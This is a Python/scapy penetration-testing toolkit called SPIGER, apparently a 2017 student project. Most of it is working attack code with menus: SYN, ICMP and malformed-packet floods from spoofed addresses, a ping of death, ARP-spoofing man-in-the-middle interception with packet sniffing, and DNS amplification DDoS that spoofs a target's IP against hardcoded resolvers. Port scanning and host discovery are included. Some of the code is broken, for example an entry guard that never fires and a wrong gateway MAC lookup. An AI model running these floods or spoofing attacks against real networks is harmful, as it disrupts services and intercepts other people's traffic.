
#============= SPIGER ==============
# Tool kit for penetration testing #
# Version 0.1                      #
# Developed for educational porpuse#
# in Halmstad University, Sweden   #
# Network Forensics Master's       #
# Dec 2017                         #_
# by Shooresh Sufiye               #
# www.spigerhome.blogspot.se       #
#===================================

from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import *


import os
import sys
import time
if __name__ == "main":

	global pd_i, sniffed_packets
	pd_i = True

	victim_ip = ""
	gateway_ip = ""
	interface = ""
	victim_mac = ""
	gateway_mac = ""
	pd_status = "attack"
	# global victim_ip, gateway_ip,interface,victim_mac, gateway_mac
	sniffed_packets =[]
	dnss_list = ["37.208.0.5","194.47.12.51"]
	#global 

	def rnd_ip(): # can be customized to generat random IPs in a given subnet
		ip =[1,1,1,1]
		ip[0] = str(random.randrange(55,193))
		ip[1] = str(random.randrange(10,250))
		ip[2] = str(random.randrange(20,252))
		ip[3] = str(random.randrange(10,240))
		rnd = ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]
		return  rnd

	def rnd_mac():
		l = "0.1.2.3.4.5.6.7.8.9.a.b.c.d.e.f".split(".")
		mac = ""
		for i in range(6):
			mac += l[random.randrange(16)] + l[random.randrange(16)]+":"
		#print(mac[:-1]) #mac = "{0}.{1}.{2}.{3}.{4}.{5}".format(rnd_hx(),)
		return mac[:-1]

	def rnd_port():
		p = random.randrange(0,800)
		return p

	def is_ip(ip):
		j=0
		ip = ip.split(".")
		if (len(ip)==4):
			for i in ip:
				if i.isnumeric():
					if(int(i) in range(0,255)):
						j+=1
		if(j==4):
			return True
		return False

	def ping_of_death():
		vip = input("Enter target IP? " ) # app_gui.getEntry("pd_vic_ip")
		try:
			if is_ip(vip):
				while True:
					for p in fragment(Ether(src=rnd_mac(),dst=get_mac(vip,"eth0"))/IP(dst=vip, src=rnd_ip()) / ICMP() / ("Hello" * 66000)):
						sendp(p)
						time.sleep(0.01)
					print("One wave sent...")
			else:
				print("-Wrong IP !")
		except KeyboardInterrupt:
			print("User Interupts!")
		except MACField:
			print("wrong input !")
		except:
			print("wrong input !")
		c = input("Press enter to continue...")
		dos_menu()

	def malformed_pck():
		t = input("Enter target IP? ")
		try:
			if is_ip(t):
				dist_mac = get_mac(t,"eth0")
				while (True):
					sendp(Ether(src=rnd_mac(), dst= dist_mac) / IP(dst=t, src=rnd_ip(), ihl=2, tos=244, version=3)/ICMP() ) #
					print(rnd_mac(),">>",  dist_mac)
					#send(packet)
					time.sleep(0.01)
		except KeyboardInterrupt:
			print("interupted by user!")
		except:
			print("wrong input !")
		c = input("Press enter to continue...")
		dos_menu()

	def menu_action(opt):
		a = 1

	def archive(arg1):
		archive = 1

	def exit_app(arg1):
		app_gui.stop()

	def get_mac(ip, iface_arg):
		try:
			print("getting mac")
			conf.verb = 0
			ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=iface_arg)
		except:
			print("wrong input !")
			mitm_menu()
		for snd, rcv in ans:
			return rcv.sprintf(r"%Ether.src%")


	def reARP():
		try:
			#app_gui.setLabel("L1", "Restoring target")
			print("Restoring target...")
			victim_mac = get_mac(victim_ip,"eth0")
			gateway_mac = get_mac(victim_ip,"eth0")
			send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
					 hwsrc= victim_mac), count=7)
			send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
					 hwsrc=gateway_mac), count=7)
			#app_gui.setLabel("L1", "Desabling IP forwarding")
			print("Desabling IP forwarding...")
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			#app_gui.setLabel("L1", "Shutting down...")
			print()
		except:
			print("wrong input !")
		c = input("press enter to continue...")
		mitm_menu()
		#sys.exit()

	def trick(gm, vm):
		send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=vm))
		send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gm))

	def show_payload():
		a=1
		sniff()

	def mitm1_attack():
		victim_ip = input("Enter client IP? ")
		gateway_ip = input("Enter gateway IP? ")
		interface = input("Enter interface?(eth0/ wifi) ")
		try:
			print("for victim, ",end="")
			victim_mac = get_mac(victim_ip,interface) #app_gui.getEntry("vic_mac_show")  #
			print(victim_mac)
		except:
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			sys.exit(1)
		try:
			print("for gateway, ", end="")
			gateway_mac =  get_mac(gateway_ip,interface) #app_gui.getEntry("gate_mac_show")
			print(gateway_mac)
		except:
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			sys.exit(1)
		try:
			while True:
				trick(gateway_mac, victim_mac)
				print(".", end="")
				#show_payload()
				sniff(lfilter=lambda dis: dis.src == victim_mac or dis.dst == victim_mac, iface=interface, prn=lambda x: x.summary())
				time.sleep(1.0)
		except:
			print("Wrong input !")
			reARP()
		mitm_menu()

	def port_scan(arg1):
		open_ports = []
		try:
			if arg1=="-1":
				ip = input("Enter IP? ")
				min_t = int(input("Enter min port#? "))
				max_t = int(input("enter max port#? "))
			else:
				ip = arg1
				min_t = 0
				max_t = 1024
			if (min_t>65535 or max_t>65535 or min_t<0 or max_t<0) : # min_t not in range(0,65536) or max_t not in range(0,65536)
				c = input("out of range!")
				port_scan("-1")
			if min_t > max_t:
				t = max_t
				max_t = min_t
				min_t = t
			if (is_ip(ip)):
				ans, unans = sr(IP(dst=ip) / TCP(sport=666, dport=(min_t, max_t), flags="S"))
				for i in range(max_t-min_t):
					if (ans[i][1][1].flags == 18):
						open_ports.append(i+min_t)
				print("\nOpen ports of {x1} in ({x2},{x3}) are:\n ".format(x1=ip,x2=min_t,x3=max_t), open_ports,"\n")
			else:
				print("-Wrong IP !")
		except:
			print("-Wrong input !")
		if(arg1=="-1"):
			c = input("press enter to continue...")
			active_menu()
		return open_ports

	def save_sniffed(arg1):
		filename= input("Enter file name? ")
		filename += ".pcap"
		try:
	#        file1 = open(filename, "wb")
			wrpcap(filename, arg1)
			print("Captured packets successfully saved to", filename)
	#        for i in sniffed_packets:
	#            bytes_sniffed_packet = bytes(i)
	#            print(">>>>",i)
	#            file1.write(bytes_sniffed_packet)
		except:
			print("ssssssssssssssssssssssssssssssssssss")
	#    file1.close()


	"""
	file2 = open(filename, "rb")
	new_sniffed_data = pickle.load(file2)
	file2.close()
	"""

	def sniff_capt(x):
		sniffed_packets.append(x)
		#print("raw packet ",x)
		#print("sniffed_packets count ", sniffed_packets.index(sniffed_packets[-1]))
		return str(sniffed_packets.index(sniffed_packets[-1]))+ " " + x.summary()

	def sniff_host():
		proto_dic = {0:"ip",1:"icmp",6:"tcp",11:"udp",17:"udp",20:"ftp",21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",110:"pop3",443:"http"}
		print("help:...")
		ip = input("Enter IP? ")
		if (is_ip(ip)):
			interface = input("Enter interface? ")
			print("\n# l1      l2   l3   from             to             type          pay \n"+"="*75)
					#0 Ether / IP / ICMP 192.168.56.102 > 192.168.56.101 echo - request 0 / Raw
			try:
				sniff(filter="host "+ip , iface=interface, store=0, prn=lambda x: sniff_capt(x))             ## , timeout=3
					#sniff(lfilter=lambda dis: dis.src == victim_mac or dis.dst == victim_mac, iface=interface,prn=lambda x: x.summary())
					#time.sleep(0.05)
			except KeyboardInterrupt:
				print("\n-Interrupted ! ")
			except:
				print("-Wrong input !")
			c = input("\nWhich packet do you interested in? (packet# | save | exit) ")
			try:
				while c!="exit":
					if c.isnumeric():
						if(int(c)>=0 and int(c)<len(sniffed_packets)):
							print(sniffed_packets[int(c)].show())
						else:
							print("-Out of range !")
					if c == "save":
						save_sniffed(sniffed_packets)
					c = input("Which packet do you interested in? (packet# | save | exit) ")
				while (sniffed_packets != []):
					sniffed_packets.pop(0)
			except:
				print("never show ;p")
		else:
			print("-Wrong IP !")
		sniff_menu()

	def show_pcap():
		filename = input("Enter filename.pcap? ")
		try:
			pcap_list = rdpcap(filename)
			for i in pcap_list:
				print(pcap_list.index(i), i.summary())
			c = input("\nWhich packet do you interested in? (packet# | save | exit) ")
			while c != "exit":
				if c.isnumeric():
					if (int(c) >= 0 and int(c) < len(pcap_list)):
						print(pcap_list[int(c)].show())
					else:
						print("-Out of range !")
				if c == "save":
					save_sniffed(pcap_list)
				c = input("Which packet do you interested in? (packet# | save | exit) ")
		except:
			print("-Wrong input !")
		passive_menu()

	def sniff_iface():
		interface = input("Enter interface? (eth# | wifi#) ")
		host_list = [[],[]]
		if interface.startswith("eth") or interface.startswith("wifi"):
			print("\n# l1      l2   l3   from             to             type          pay \n" + "=" * 75)
			try:
				sniff(iface=interface, store=0, prn=lambda x: sniff_capt(x))
			except KeyboardInterrupt:
				print("\n-Interrupted ! ")
			except:
				print("-Wrong input !")
			for i in sniffed_packets:
				if i.src not in host_list[0]:
					host_list[0].append(i.src)
					#print(i.sprintf("IP.src"))
				if (i.dst not in host_list[1]):
					host_list[1].append(i.dst)
			for j in host_list[1]:
				if j in host_list[0]:
					host_list[1].remove(j)

			print("\nfound hosts so far:","\nSource:\n", host_list[0],"\nDistination:\n",host_list[1],"\n")
			c = input("\nWhich packet do you interested in? (packet# | save | exit) ")
			try:
				while c!="exit":
					if c.isnumeric():
						if(int(c)>=0 and int(c)<len(sniffed_packets)):
							print(sniffed_packets[int(c)].show())
						else:
							print("-Out of range !")
					if c == "save":
						save_sniffed(sniffed_packets)
					c = input("Which packet do you interested in? (packet# | save | exit) ")
				while (sniffed_packets != []):
					sniffed_packets.pop(0)
			except:
				print("never show ;p")
		else:
			print("-Wrong interface !")
		c= input("press enter to continue...")
		sniff_menu()

	def sniff_menu():
		menu_show(menu_8)
		choice = input("Eneter your choice? ")
		if choice == "1":
			sniff_iface()
		elif choice == "2":
			sniff_host()
		elif choice == "3":
			passive_menu()
		sniff_menu()

	def passive_menu():
		menu_show(menu_6)
		choice = input("Enter your choice? ")
		if choice=="1":
			sniff_menu()
		if choice == "2":
			show_pcap()
		elif choice=="3":
			info_menu()
		passive_menu()

	def active_menu():
		active = 1
		menu_show(menu_7)
		choice = input("Enter yuor choice? ")
		# if elif else out of range
		if choice == "2":
			ports = port_scan("-1")
		elif choice == "1":
			who_is_up()
		elif choice == "3":
			info_menu()
		else:
			active_menu()
		conti = input("press enter to continue...")
		active_menu()

	def icmp_f():
		ip = input("Enter IP? ")
		try:
			if (is_ip(ip)):
				while True:
					#ans, unans = sr(IP(dst=ip)/ICMP()/"icmp"*1000)
					sendp(Ether(src=rnd_mac())/IP(dst=ip,src=rnd_ip())/ICMP()/("icmp")*random.randrange(2,5))
			else:
				print("-Wrong IP !")
		except KeyboardInterrupt:
			print("user interupte!")
		c = input("Press Enter to continue...")
		dos_menu()

	def who_is_up():
		ip1 = input("hosts from ip: ")
		ip2 = input("to ip        : ")
		ups=[]
		try:
			if (is_ip(ip1) and is_ip(ip2)):
				ip1_octets = ip1.split(".")
				ip2_octets = ip2.split(".")
				for i in range(4):
					ip1_octets[i] = int(ip1_octets[i])
					ip2_octets[i] = int(ip2_octets[i])
				for g in range(ip1_octets[0],ip2_octets[0]+1):  # covers all IPs in the range
					if(ip1_octets[0] < ip2_octets[0]):        # if corresponding 'to' octet is >,
						ip2_octets[1] = 255                 #  next octet iterate up to 255
						if g>ip1_octets[0]:               # from second pass,
							ip1_octets[1]=0             # next octet start from 0 to iterate
						if g==ip2_octets[0]:          # for last pass max return to initial(input) value
							ip2_octets[1]=int(ip2.split(".")[1])
					for h in range(ip1_octets[1],ip2_octets[1]+1):
						if(ip1_octets[1] < ip2_octets[1]):
							ip2_octets[2] = 255
							if h>ip1_octets[1]:
								ip1_octets[2]=0
							if h==ip2_octets[1]:
								ip2_octets[2]=int(ip2.split(".")[2])
						for i in range(ip1_octets[2],ip2_octets[2]+1):
							if (ip1_octets[2] < ip2_octets[2]):
								ip2_octets[3] = 255
								if i > ip1_octets[2]:
									ip1_octets[3] = 0
								if i == ip2_octets[2]:
									ip2_octets[3] = int(ip2.split(".")[3])
							for j in range(ip1_octets[3],ip2_octets[3]+1):
								t_ip = "{0}.{1}.{2}.{3}".format(g, h, i, j)
								replay = sr1(IP(dst=t_ip, ttl=64)/ICMP(),timeout=2)
								print(t_ip)
								if replay != None:   # get answer
									ups.append(replay.src)
				print("\nlist of up hosts (in the range):\n",ups)
			else:
				print("-Wrong IP !")
		except:
			print("-Wrong input !")
		c = input("press enter to continue...")
		active_menu()

	def syn_f():
		ip = input("Enter ip?")
		try:
			if (is_ip(ip)):
				open_ports = port_scan(ip)
				op = input("Enter port #?(-all | port#,#) ").split(",")

				if op != "-all":
					open_ports = []
					for i in op:
					   open_ports.append(int(i))
					print(open_ports)
				if len(open_ports) > 0:
					try:
						while True:
							sendp(Ether(src=rnd_mac())/IP(dst=ip, src=rnd_ip(), tos=244) / TCP(sport=rnd_port(), dport=open_ports, flags="S"))
					except KeyboardInterrupt:
						print("interupted by user!")
					except:
						print("wrong input !")
				else:
					print("All <1024 ports of target are closed!")
			else:
				print("-Wrong IP !")
		except:
			print("-Wrong input !")
		c = input("Press Enter to continue...")
		dos_menu()

	def dns_ddos():
		print(" this DNS DDoS uses default DNS servers...")
		target_ip = input("Enter target public IP? ")
		i=""
		if not is_ip(target_ip):
			wait= input("IP address is wrong!")
			dns_ddos()
		try:
			while i=="":
				for i in dnss_list:
					send(IP(src= target_ip, dst=i)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.", qtype=255))) #dnstypye=255
		except KeyboardInterrupt:
			wait = input("Press enter to continue...")
			ddos_menu()

	def get_ddos():
		  print(" this GET DDoS uses default DNS servers...")
		  target_ip = input("Enter target public IP? ")
		  i=""
		  if not is_ip(target_ip):
			  wait= input("IP address is wrong!")
			  dns_ddos()
		  try:

			  while i=="":
				  for i in dnss_list:
					  send(IP(src=target_ip, dst=i)/TCP(dport=80, flags="S"))
					  send(IP(src=target_ip, dst=i)/TCP(dport=80))
		  except KeyboardInterrupt:
			  wait = input("Press enter to continue...")
			  ddos_menu()



	#      CLI UI             **********************************
	#

	#target_ip = "192.168.56.102"  # input("Enter IP: ")
	#print(target_ip)
	menu_1 = ["__// App  Menu \____","App            |", "About          |", "Help           |", "Back           |", "               |", "               |","+------------------+"]
	menu_2 = ["__// info Menu \____","info           |", "Passive        |", "Active         |", "Back           |", "               |", "               |","+------------------+"]
	menu_3 = ["__// DoS  Menu \____","DoS            |", "SYN flood      |", "ICMP flood     |", "Ping of Death  |", "Malform packet |", "Back           |","+------------------+"]
	menu_4 = ["__// MiTM Menu \____","MiTM           |", "MiTM 1         |", "MiTM 1         |", "Back           |", "               |", "               |","+------------------+"]
	menu_45= ["__// MiTM Menu \____","DDoS           |", "DNS DDoS       |", "GET atk        |", "Back           |", "               |", "               |","+------------------+"]
	menu_5 = [" ", "Exit Spiger    |"]
	menu_6 = ["__/// Passive \_____","passive        |", "Sniff          |", "Open .pcap file|", "Back           |", "               |", "               |","+------------------+"]
	menu_7 = ["__/// Active  \_____","active         |", "Who is up?     |", "Port scan      |", "Back           |", "               |", "               |","+------------------+"]
	menu_8 = ["__//// Sniffing \___","sniffing       |", "Sniff interface|", "Sniff a host   |", "Back           |", "               |", "               |","+------------------+"]
	menu_m = ["__/ Spiger \________",menu_1, menu_2, menu_3, menu_4, menu_45,menu_5,"+------------------+"]

	def About():
		
            logo_str =  '''
                                 *%\                                            
                                 %@@@#                /,                         
                                *@@@@@@@%,         ./%@@&                      
                          ,/((//(/#&@@@@@@@&* .#&@@@@@@@@,                     
                        *(/////(*.  .(%%%@@@@@@@@@@@@@@@@*                     
                       .(/*(##%/,  ,% ,@,  ./**&&* .,//                        
                    ./#&@@@@/*,   (@@#   .,.%.%@/ .*&@@#.                    
                   #@@@@@&(****(,.         ./,,@@#  ,(@@@%%(                   
             ,#@@%&&%%@@&/******(,.       ,//.     .*#(#(//*                   
           *@#.     ,(//********##(,....,*(*((*..,,//*((#%#.                   
         *@#      /////******(&(******(*********/**///#@@@@@%                  
        #@*      (@@@&&(***//*&/*************/((#&@@@@@@@@&%%&%%&@*            
       @%       .&@@@@@&@@@#**/@&(/**********/(#&&@@@@@@@@@@@&.  .@#           
     *@*    ,%@%&@&&@#&@@&*******(%&&&&&&&(*****//*///(((##%&@,   *@,          
   ,,.     &&   .&@(%@@(*****/#&&%(/******/(&&&%#(////(##(*(#%,    &%          
          *@,    ((,(//*********/(&@@@@@@@@@@@&&&&@@##%%%&@%.      %%          
          (@,      ,%((/*************((/(/*///////((((%##@%  (@,   %&          
          ,@,       %@%((//**/#@@@&(###((##%#((#######(   .@,  %&.         
           %%        (%&@@%#(///////(#&@@@@@@@@@@@@@@@#.@@@,   %%  %&          
           %%        /@%/###%%%&%###(((####(##%@@@@@@@, (.*@*  /@, .&%         
           *@,      ,@/  .%&%###%%%%%%%&(%@@@@@%/ (##%.    #@. ,@(   ,         
           *@,      ,@,     (@@@%%######/   ,##,   ##%&    #@,  *@/            
          *@(       .@#        @,     .(/    .       *@   ,@*     #@#.         
         (@,         %%        @,                    %%   %%        ,(         
                     ,@        &%                   /@,  *@,                   
                      &,       .@#                  %%  .                    
                      *%       ..&&                *@*  %&,                    
                       @*       ,*&&               ,&&.   #@@%                 
                      ,@#        ,/@(                /%%&,                     
                                .*%@*   
'''
		print("-"*72, "\n", logo_str)
		print("+----------------------+\n"
			  "|  SPIGER version 0.1  |\n"
			  "|   Author  5HOOR3SH   |\n"
			  "| Halmstad  University |\n"
			  "|         2017         |\n"
			  "+----------------------+")
		input("\npress enter to continue...")
		app_menu()

	def help():
		print("For help and read documentation visit:\nhttp://www.shooreshsufiye.blogspot.se/spiger")
		input("press enter to continue...")
		app_menu()

	def menu_show(m):
		os.system("clear")
		for i in range(len(m)):
			if (i > 1 and i < len(m) - 1):
				if m[i] != "               |":
					print("|", i - 1, m[i])  # number?
				else:
					print("|  ", m[i])  # number?
			elif (i != 1):
				print(m[i])

				#    print("\n+---DoS  Menu---+\n","|1.SYN flood    |\n","|2.ICMP flood   |\n","|3.Ping of Death|\n","|4.Malf. packet |\n","|5.Back         |\n","+---------------+\n")

	def app_menu():
		menu_show(menu_1)
		choice = input("Enter your choice? ")
		# if elif else out of range
		if choice == "1":
			About()
		elif choice == "2":
			help()
		elif choice == "3":
			ui()
		else:
			app_menu()

	def info_menu():
		menu_show(menu_2)
		#    print("\n+---DoS  Menu---+\n","|1.SYN flood    |\n","|2.ICMP flood   |\n","|3.Ping of Death|\n","|4.Malf. packet |\n","|5.Back         |\n","+---------------+\n")
		choice = input("Enter your choice? ")
		# if elif else out of range
		if choice == "1":
			passive_menu()
		elif choice == "2":
			active_menu()
		elif choice == "3":
			ui()
		else:
			info_menu()

	def dos_menu():
		menu_show(menu_3)
	#    print("\n+---DoS  Menu---+\n","|1.SYN flood    |\n","|2.ICMP flood   |\n","|3.Ping of Death|\n","|4.Malf. packet |\n","|5.Back         |\n","+---------------+\n")
		choice = input("Enter your choice? ")
		# if elif else out of range
		if choice == "1":
			syn_f()

			#syn_f_ins = synF()
			#syn_f_ins.run("1")
			#print(syn_f_ins.syn_vic_ip)
		elif choice == "2":
			icmp_f()
		elif choice == "3":
			ping_of_death()
		elif choice == "4":
			malformed_pck()
		elif choice == "5":
			ui()
		dos_menu()

	def mitm_menu():
		menu_show(menu_4)
		choice = input("Enter yuor choice? ")
		if choice == "1":
			print("man in the middle 1")
			mitm1_attack()
		elif(choice == "2"):
			print("man in the middle 2")
		elif choice == "3":
			ui()
		mitm_menu()

	def ddos_menu():
		menu_show(menu_45)
		#    print("\n+---DoS  Menu---+\n","|1.SYN flood    |\n","|2.ICMP flood   |\n","|3.Ping of Death|\n","|4.Malf. packet |\n","|5.Back         |\n","+---------------+\n")
		choice = input("Enter your choice? ")
		# if elif else out of range
		if choice == "1":
			dns_ddos()
		elif choice == "2":
			print("under construction")
		elif choice == "3":
			ui()
		else:
			ddos_menu()

	def ui():
		os.system("clear")
		for i in range(len(menu_m)):
			if (i > 0 and i < len(menu_m)-1):
				print("|", i ,menu_m[i][1])  #  number?
			else:
				print(menu_m[i])

		menu_choice = input("Enter choice number? ")
		if menu_choice == "1":
			app_menu()
		elif menu_choice == "2":
			info_menu()
		elif menu_choice == "3":
			dos_menu()
		elif menu_choice == "4":
			mitm_menu()
		elif menu_choice == "5":
			ddos_menu()
		elif menu_choice == "6":
			os.system("clear")
			exit()
		ui()

	ui()


logo_str =  '''
                                 */                                            
                                 %@@@#                                         
                                *@@@@@@@%,         ./%@@&                      
                          ,/((//(/#&@@@@@@@&* .#&@@@@@@@@,                     
                        *(/////(*.  .(%%%@@@@@@@@@@@@@@@@*                     
                       .(/*(##%/,  ,% ,@,  ./**&&* .,//                        
                    ./#&@@@@/*,   (@@#   .,.%.%@/ .*&@@#.                    
                   #@@@@@&(****(,.         ./,,@@#  ,(@@@%%(                   
             ,#@@%&&%%@@&/******(,.       ,//.     .*#(#(//*                   
           *@#.     ,(//********##(,....,*(*((*..,,//*((#%#.                   
         *@#      /////******(&(******(*********/**///#@@@@@%                  
        #@*      (@@@&&(***//*&/*************/((#&@@@@@@@@&%%&%%&@*            
       @%       .&@@@@@&@@@#**/@&(/**********/(#&&@@@@@@@@@@@&.  .@#           
     *@*    ,%@%&@&&@#&@@&*******(%&&&&&&&(*****//*///(((##%&@,   *@,          
   ,,.     &&   .&@(%@@(*****/#&&%(/******/(&&&%#(////(##(*(#%,    &%          
          *@,    ((,(//*********/(&@@@@@@@@@@@&&&&@@##%%%&@%.    %%          
          (@,      ,%((/*************((/(/*///////((((%##@%  (@,   %&          
          ,@,       %@%((//**/#@@@&(###((##%#((#######(   .@,  %&.         
           %%        (%&@@%#(///////(#&@@@@@@@@@@@@@@@#.@@@,   %%  %&          
           %%        /@%/###%%%&%###(((####(##%@@@@@@@, (.*@*  /@, .&%         
           *@,      ,@/  .%&%###%%%%%%%&(%@@@@@%/ (##%.    #@. ,@(   ,         
           *@,      ,@,     (@@@%%######/   ,##,   ##%&    #@,  *@/            
          *@(       .@#        @,     .(/    .       *@   ,@*     #@#.         
         (@,         %%        @,                    %%   %%        ,(         
                     ,@        &%                   /@,  *@,                   
                      &,       .@#                  %%  .                    
                      *%       ..&&                *@*  %&,                    
                       @*       ,*&&               ,&&.   #@@%                 
                      ,@#        ,/@(                /%%&,                     
                                .*%@*   
'''

	#
